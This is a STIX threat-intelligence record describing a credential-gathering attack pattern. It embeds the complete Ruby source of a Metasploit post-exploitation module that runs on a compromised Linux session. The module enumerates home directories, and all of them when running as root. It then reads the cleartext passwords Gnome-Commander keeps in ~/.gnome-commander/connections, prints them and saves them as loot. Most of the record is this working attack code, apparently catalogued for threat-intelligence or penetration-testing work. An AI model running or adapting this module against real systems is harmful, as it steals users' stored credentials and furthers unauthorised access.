{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db2ddac6-6328-4b3c-8cd7-f1175eda1461",
    "created": "2024-08-14T16:33:17.983497Z",
    "modified": "2024-08-14T16:33:17.9835Z",
    "name": "Linux Gather Gnome-Commander Creds",
    "description": " This module collects the clear text passwords stored by Gnome-commander, a GUI file explorer for GNOME.  Typically, these passwords are stored in the user's home directory, at ~/.gnome-commander/connections.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/gnome_commander_creds.rb",
            "external_id": "gnome_commander_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather Gnome-Commander Creds',\n        'Description' => %q{\n          This module collects the clear text passwords stored by\n          Gnome-commander, a GUI file explorer for GNOME.  Typically, these\n          passwords are stored in the user's home directory, at\n          ~/.gnome-commander/connections.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'David Bloom' ], # Twitter: @philophobia78\n        'Platform' => %w[linux],\n        'SessionTypes' => [ 'meterpreter', 'shell']\n      )\n    )\n  end\n\n  def run\n    user_dirs = []\n    # Search current user\n    user = cmd_exec('whoami').chomp\n    # User is root\n    if user == 'root'\n      print_status(\"Current user is #{user}, probing all home dirs\")\n      user_dirs << '/root'\n      # Search home dirs\n      cmd_exec('ls /home').each_line.map { |l| user_dirs << \"/home/#{l}\".chomp }\n    else\n      # Non root user\n      print_status(\"Current user is #{user}, probing /home/#{user}\")\n      user_dirs << \"/home/#{user}\"\n    end\n    # Try to find connections file in users homes\n    user_dirs.each do |dir|\n      # gnome-commander connections file\n      connections_file = \"#{dir}/.gnome-commander/connections\"\n      if file?(connections_file)\n        # File.exist\n        begin\n          str_file = read_file(connections_file)\n          print_good(\"File found: #{connections_file}\")\n          vprint_line(str_file)\n          # Store file\n          p = store_loot('connections', 'text/plain', session, str_file, connections_file, 'Gnome-Commander connections')\n          print_good(\"Connections file saved to #{p}\")\n        rescue EOFError\n          # If there's nothing in the file, we hit EOFError\n          print_error(\"Nothing read from file: #{connections_file}, file may be empty\")\n        end\n      else\n        # File not found\n        vprint_error(\"File not found: #{connections_file}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux]"
    ]
}